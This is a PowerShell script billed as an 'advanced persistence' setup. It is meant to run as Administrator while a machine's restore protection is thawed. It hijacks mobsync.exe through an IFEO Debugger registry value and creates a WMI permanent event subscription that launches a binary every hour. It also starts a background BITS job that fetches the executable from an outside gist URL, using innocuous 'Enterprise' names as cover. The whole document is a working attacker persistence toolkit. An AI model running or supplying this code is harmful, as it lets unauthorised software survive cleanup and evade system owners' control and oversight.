# Advanced Persistence Setup Script
# Requirements: Run as Administrator during "THAWED" state

$persistentBin = "D:\EnterpriseTools\Bin\core-client.exe"

# 1. IFEO (Image File Execution Options) Hijacking
# Redirects 'mobsync.exe' (Sync Center) to our agent.
Write-Host "Configuring IFEO Hijacking for mobsync.exe..." -ForegroundColor Cyan
$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mobsync.exe"
if (-not (Test-Path $ifeoPath)) { New-Item -Path $ifeoPath -Force }
Set-ItemProperty -Path $ifeoPath -Name "Debugger" -Value $persistentBin

# 2. WMI Permanent Event Subscription
# Triggers the agent every 60 minutes via the CommandLineEventConsumer.
Write-Host "Configuring WMI Permanent Event Subscription..." -ForegroundColor Cyan
$filterName = "EnterpriseAgentFilter"
$consumerName = "EnterpriseAgentConsumer"

$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $persistentBin
    RunInteractively = $false
}

# Bind Filter and Consumer
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# 3. BITS "Dead Man's Switch"
# Background Intelligent Transfer Service job for self-healing/redownload.
Write-Host "Configuring BITS Self-Healing Job..." -ForegroundColor Cyan
$bitsJob = Start-BitsTransfer -Source "https://gist.githubusercontent.com/status/core-client.exe" `
                             -Destination $persistentBin `
                             -Asynchronous `
                             -DisplayName "EnterpriseComputeUpdate" `
                             -Priority Background
# Set to retry indefinitely
# (Note: In a real environment, you'd use a script to check if file exists and resume bits)

Write-Host "Advanced Persistence Framework Initialized." -ForegroundColor Green
